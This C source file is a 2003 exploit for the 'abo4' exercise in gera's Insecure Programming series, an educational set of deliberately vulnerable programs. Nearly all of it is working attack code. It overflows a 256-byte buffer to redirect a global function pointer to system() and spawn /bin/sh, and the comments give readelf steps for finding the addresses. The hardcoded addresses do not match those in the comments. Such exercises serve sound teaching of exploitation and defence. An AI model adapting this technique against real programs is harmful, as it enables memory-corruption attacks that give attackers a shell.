/*
 *  * $Id: abo4-ex2.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *   *
 *    * abo4-ex2.c - abo4.c exploit, for educational purposes
 *     * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *      *
 *       * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *        *
 *         * This exploit overflows the buffer buf[256], overwriting the value of the 
 *          * pointer char *pbuf with the address of the function pointer 
 *           * void (*fn)(char*), declared as global (specifically, it's saved in the 
 *            * .data section of the heap, because of its initialization). Then it copies 
 *             * the system() address (argv[2]) into fn() and executes /bin/sh (argv[3]). 
 *              * Use the following commands to grab the correct addresses for your system:
 *               *
 *                * $ readelf -a abo4 | grep fn
 *                 *     79: 080495d0     4 OBJECT  GLOBAL DEFAULT   15 fn
 *                  *         ^^^^^^^^\__(this is the fn() address)
 *                   *
 *                    * $ readelf -a abo4 | grep system
 *                     * 080496c0  00000207 R_386_JUMP_SLOT   08048374   system
 *                      *      2: 08048374   729 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
 *                       *     62: 08048374   729 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
 *                        *         ^^^^^^^^\__(this is the system() address)
 *                         */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF 	261			// 256 + 4 + 1
#define FN	0x0804a030		// fn() address in globals
#define SYSTEM	0xf7e50190		// system() address in PLT
#define CMD	"/bin/sh"		// arg for system()

int main(int argc, char *argv[])
{
  int i, fn_addr = FN, system_addr = SYSTEM;
  char *arg[5], buf[BUF], buf2[5];
  int *ap = (int*) buf; /* address pointer */

  fprintf(stderr, "Using fn() address: 0x%X\n", fn_addr);
  fprintf(stderr, "Using system() address: 0x%X\n", system_addr);
  
  /* fill the vulnerable buffer */

  for(i = 0; i < BUF-1; i += 4){
    *ap = fn_addr;
    fprintf(stderr, "ap: 0x%X\n", *ap);
    ap++;
  }
  fprintf(stderr, "i = %d\n", i);
  *((char*)ap) = 0x0;

  /* prepare argv[2] with the system() address */
  ap = (int*) buf2;
  *ap++ = system_addr;
  *((char*)ap) = 0x0;

  arg[0] = "./abo4";
  arg[1] = buf;
  arg[2] = buf2;
  arg[3] = CMD;
  arg[4] = NULL;

  /* run the vulnerable program */
  execve(arg[0], arg, NULL);
  perror("execve");
}

